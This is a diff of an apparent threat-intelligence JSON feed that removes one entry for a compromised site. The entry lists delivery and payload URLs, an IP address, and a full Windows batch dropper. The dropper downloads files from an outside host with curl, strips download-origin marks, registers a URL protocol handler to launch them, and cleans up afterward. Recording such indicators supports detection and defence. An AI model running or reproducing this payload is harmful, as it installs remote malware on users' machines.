@@ -1981,27 +1981,5 @@
     ],
     "ReportId": "cmwdrfian04ln0omlizrkni0i",
     "ScannedAt": "2026-11-12T16:26:18.120000+00:00"
-  },
-  {
-    "UrlDomain": "electricalinstallationservices.co.uk",
-    "DeliveryUrl": [
-      "microhash9382.com"
-    ],
-    "PayloadUrl": [
-      "https://microhash9382.com/ue/x/VFOjtWRN",
-      "https://microhash9382.com/ue/b/VFOjtWRN",
-      "https://microhash9382.com/ue/c/5AZ4cnB0"
-    ],
-    "IP": [
-      "104.199.82.121"
-    ],
-    "Related": [],
-    "Payload": "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://microhash9382[.]com/ue/x/VFOjtWRN <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://microhash9382[.]com/ue/b/VFOjtWRN <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo VFOjtWRN microhash9382[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul",
-    "ResolvedDownloadUrl": [
-      "https://microhash9382.com/ue/x/VFOjtWRN",
-      "https://microhash9382.com/ue/b/VFOjtWRN"
-    ],
-    "ReportId": "cmwdjpmnl04eq0omlovw4ivj8",
-    "ScannedAt": "2026-11-12T12:50:13.353000+00:00"
   }
 ]
